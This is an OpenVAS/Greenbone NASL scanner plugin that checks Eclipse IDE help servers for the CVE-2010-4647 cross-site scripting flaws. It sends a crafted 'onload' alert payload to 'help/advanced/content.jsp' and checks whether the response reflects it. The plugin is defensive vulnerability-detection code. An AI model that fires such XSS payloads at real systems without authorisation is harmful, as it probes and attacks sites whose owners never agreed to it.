# SPDX-FileCopyrightText: 2011 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.801745");
  script_version("2023-07-28T05:05:23+0000");
  script_tag(name:"last_modification", value:"2023-07-28 05:05:23 +0000 (Fri, 28 Jul 2023)");
  script_tag(name:"creation_date", value:"2011-02-17 16:08:28 +0100 (Thu, 17 Feb 2011)");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_cve_id("CVE-2010-4647");
  script_name("Eclipse IDE < 3.6.2 Multiple XSS Vulnerabilities");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2011 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "httpver.nasl", "global_settings.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/64833");
  script_xref(name:"URL", value:"http://r00tin.blogspot.com/2008/04/eclipse-local-web-server-exploitation.html");
  script_xref(name:"URL", value:"http://yehg.net/lab/pr0js/advisories/eclipse/[eclipse_help_server]_cross_site_scripting");

  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to execute arbitrary HTML
  and script code in a user's browser session in the context of an affected application.");

  script_tag(name:"insight", value:"- Input passed to the 'onload' parameter in 'help/index.jsp' and
  'help/advanced/content.jsp' are not properly sanitised before being
  returned to the user.");

  script_tag(name:"summary", value:"Eclipse IDE is prone to multiple cross-site scripting (XSS) vulnerabilities.");

  script_tag(name:"affected", value:"Eclipse IDE Version 3.6.1 and prior");

  script_tag(name:"solution", value:"Upgrade to Eclipse IDE Version 3.6.2 or later");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_vul");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("port_service_func.inc");
include("misc_func.inc");

## Listens on the ports in the range 900-70000
port = http_get_port( default:80 );

rcvRes = http_get_cache( item:"/help/index.jsp", port:port );

if( "<title>Help - Eclipse" >< rcvRes ) {

  url = "/help/advanced/content.jsp?'onload='alert" +
        "('XSS-Testing')";
  sndReq = http_get( item:url, port:port );
  rcvRes = http_keepalive_send_recv( port:port, data:sndReq );

  if( rcvRes =~ "^HTTP/1\.[01] 200" && "alert('XSS-Testing')" >< rcvRes ) {
    report = http_report_vuln_url( port:port, url:url );
    security_message( port:port, data:report );
    exit( 0 );
  }
  exit( 99 );
}

exit( 0 );
